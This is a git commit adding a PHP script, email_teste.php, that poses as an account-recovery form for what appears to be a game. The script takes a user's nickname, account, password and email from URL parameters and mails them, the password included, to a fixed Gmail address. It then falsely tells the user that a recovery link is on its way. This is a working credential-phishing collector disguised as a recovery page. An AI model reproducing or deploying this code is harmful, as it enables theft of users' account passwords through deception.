932c9de2d7a5cc308d8df2a550af04c7ab0d6fac
Miguel Luiz Capristano <71992751+miguel-luiz-cap@users.noreply.github.com>
2021-02-18 22:53:42 -0300

    Create email_teste.php

---
+++ email_teste.php
@@ -0,0 +1,70 @@
+<?php
+//Variáveis
+
+$nome = $_GET['nick'];
+$conta = $_GET['conta'];
+$senha = $_GET['senha'];
+$email = $_GET['email'];
+$data_envio = date('d/m/Y');
+$hora_envio = date('H:i:s');
+
+// Compo E-mail
+$arquivo = "
+	<style type='text/css'>
+	body {
+	margin:0px;
+	font-family:Verdane;
+	font-size:12px;
+	color: #666666;
+	}
+	a {
+	color: #666666;
+	text-decoration: none;
+	}
+	a:hover {
+	color: #FF0000;
+	text-decoration: none;
+	}
+	</style>
+	<html>
+		<h3>Recuperação de Conta:</h3>
+
+		<table width='510' border='1' cellpadding='1' cellspacing='1' bgcolor='#CCCCCC'>
+			<tr>
+				<td>
+					<tr><td width='500'>Nome:$nome</td></tr>
+					<tr><td width='320'>E-mail:<b>$email</b></td></tr>
+					<tr><td width='320'>Conta:$conta</td></tr>
+					<tr><td width='320'>Senha:<b>$senha</b></td></tr>
+					<tr><td width='320'>Lembre-se de Trocar a senha ao relogar para evitar problemas</td></tr>
+				</td>
+			</tr>
+			<tr>
+				<td>Este e-mail foi enviado em <b>$data_envio</b> às <b>$hora_envio</b></td>
+			</tr>
+		</table>
+	</html>";
+
+	//enviar
+	// emails para quem será enviado o formulário
+	$emailenviar = "perfectscrash@gmail.com";
+	$destino = $emailenviar;
+	$assunto = "[ZP] Recuperacao de conta";
+
+	// É necessário indicar que o formato do e-mail é html
+	$headers  = 'MIME-Version: 1.0' . "\r\n";
+	$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
+	$headers .= 'From: $nome <$email>';
+
+
+ 
+	$enviaremail = mail($destino, $assunto, $arquivo, $headers);
+	if($enviaremail) {
+		$mgm = "E-MAIL ENVIADO COM SUCESSO! <br>O link será enviado para o e-mail cadastrado na conta <br/>Verifique tambem sua caixa de Spawn";
+		echo " <meta http-equiv='refresh' content='10;URL=contato.php'>";
+	} 
+	else {
+		$mgm = "ERRO AO ENVIAR E-MAIL!";
+		echo "";
+	}
+?>
